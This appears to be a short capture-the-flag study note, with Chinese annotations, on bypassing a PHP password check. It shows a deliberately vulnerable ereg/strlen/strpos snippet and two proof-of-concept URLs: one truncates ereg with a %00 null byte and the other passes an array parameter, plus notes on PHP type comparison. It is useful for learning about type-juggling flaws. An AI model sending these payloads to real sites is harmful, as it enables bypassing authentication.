# php match

## ereg

* example

'''php
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE){
	echo '<p>You password must be alphanumeric</p>';
}
else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999){
    if (strpos ($_GET['password'], '*-*') !== FALSE){
        die('Flag: ' . $flag);
    }
}
    
'''

* poc 1

'''
url: ...?password=1e9%00*-*
'''
此处利用 ereg 漏洞，读到 ** %00 ** 就截止了

* poc 2

'''
url: ...?password[]=s
''' 

**传入数组**
ereg 返回** NULL** ，NULL !== FALSE is true
strpos 处理数组，也返回 ** NULL **
strlen 处理数组，同样返回 **NULL**

**比较**
null 和 任何其他任何类型，比较，转换为 bool， FALSE < TRUE
array 和  任何其他类型（不包括 object）， 比较， array 总是更大